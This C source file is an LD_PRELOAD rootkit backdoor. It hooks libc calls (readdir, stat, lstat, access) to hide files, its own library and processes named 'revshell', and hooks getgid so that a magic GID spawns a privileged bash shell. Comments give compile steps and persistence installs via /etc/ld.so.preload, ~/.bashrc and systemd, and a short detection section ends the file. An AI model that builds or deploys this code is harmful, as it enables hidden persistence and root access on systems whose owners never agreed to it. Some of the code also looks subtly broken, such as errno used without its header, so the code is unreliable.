/*
 * LD_PRELOAD Shared Library Backdoor
 * MITRE ATT&CK: T1574.006 — Hijack Execution Flow: LD_PRELOAD
 *
 * Hooks libc functions to:
 *   - Hide files/directories matching a pattern
 *   - Hide processes matching a pattern
 *   - Provide backdoor root shell via magic GID
 *
 * Compile:
 *   gcc -fPIC -shared -o libprocessor.so ld_preload_backdoor.c -ldl -D_GNU_SOURCE
 *
 * Install (requires root):
 *   # System-wide (loads into EVERY process)
 *   echo /path/to/libprocessor.so > /etc/ld.so.preload
 *
 *   # Per-process (less obvious)
 *   export LD_PRELOAD=/path/to/libprocessor.so
 *
 * Usage:
 *   # Trigger backdoor shell (set magic GID on any file, then execute it)
 *   touch /tmp/.trigger
 *   chgrp MAGIC_GID /tmp/.trigger
 *   # Any SUID binary run while this is preloaded will drop to root
 *
 * Cleanup:
 *   rm /etc/ld.so.preload
 *   rm /path/to/libprocessor.so
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>

/* Configuration — change these before compiling */
#define HIDDEN_PREFIX  ".backdoor"   /* hide files/dirs starting with this */
#define HIDDEN_PROC    "revshell"    /* hide processes with this name */
#define MAGIC_GID      1337          /* GID that triggers root shell */
#define BACKDOOR_PASS  "s3cur3p4ss"  /* password for PAM-less backdoor */

/* ── Hide files from readdir ── */

static struct dirent *(*real_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!real_readdir)
        real_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        /* Hide files with our prefix */
        if (strstr(entry->d_name, HIDDEN_PREFIX) != NULL)
            continue;
        /* Hide our library */
        if (strstr(entry->d_name, "libprocessor.so") != NULL)
            continue;
        /* Hide processes in /proc by checking cmdline */
        if (entry->d_type == DT_DIR) {
            char cmdline_path[512];
            char cmdline[256];
            snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", entry->d_name);
            FILE *f = fopen(cmdline_path, "r");
            if (f) {
                if (fgets(cmdline, sizeof(cmdline), f) && strstr(cmdline, HIDDEN_PROC)) {
                    fclose(f);
                    continue;
                }
                fclose(f);
            }
        }
        return entry;
    }
    return NULL;
}

/* ── Hide files from stat ── */

static int (*real_stat)(const char *, struct stat *) = NULL;
static int (*real_lstat)(const char *, struct stat *) = NULL;

int stat(const char *pathname, struct stat *statbuf) {
    if (!real_stat)
        real_stat = dlsym(RTLD_NEXT, "stat");

    if (strstr(pathname, HIDDEN_PREFIX) || strstr(pathname, "libprocessor.so")) {
        errno = 2; /* ENOENT */
        return -1;
    }
    return real_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf) {
    if (!real_lstat)
        real_lstat = dlsym(RTLD_NEXT, "lstat");

    if (strstr(pathname, HIDDEN_PREFIX) || strstr(pathname, "libprocessor.so")) {
        errno = 2;
        return -1;
    }
    return real_lstat(pathname, statbuf);
}

/* ── Hide from open (return ENOENT for hidden files) ── */

static int (*real_access)(const char *, int) = NULL;

int access(const char *pathname, int mode) {
    if (!real_access)
        real_access = dlsym(RTLD_NEXT, "access");

    if (strstr(pathname, HIDDEN_PREFIX) || strstr(pathname, "libprocessor.so")) {
        errno = 2;
        return -1;
    }
    return real_access(pathname, mode);
}

/* ── Backdoor via getgid — if process has magic GID, escalate ── */

static gid_t (*real_getgid)(void) = NULL;

gid_t getgid(void) {
    if (!real_getgid)
        real_getgid = dlsym(RTLD_NEXT, "getgid");

    gid_t gid = real_getgid();
    if (gid == MAGIC_GID) {
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
    }
    return gid;
}

/*
 * Alternative installation methods:
 *
 * 1. /etc/ld.so.preload (system-wide, survives reboots)
 *    echo "/lib/x86_64-linux-gnu/libprocessor.so" > /etc/ld.so.preload
 *
 * 2. LD_PRELOAD in shell profile (per-user)
 *    echo "export LD_PRELOAD=/tmp/.libs/libprocessor.so" >> ~/.bashrc
 *
 * 3. Systemd service environment
 *    In service file: Environment=LD_PRELOAD=/path/to/lib.so
 *
 * Detection:
 *    cat /etc/ld.so.preload
 *    grep LD_PRELOAD /etc/environment /etc/profile /home/*/.bashrc
 *    ldd /usr/sbin/sshd  # shows preloaded libs
 *    strace -e openat ls  # reveals hidden readdir hooks
 */
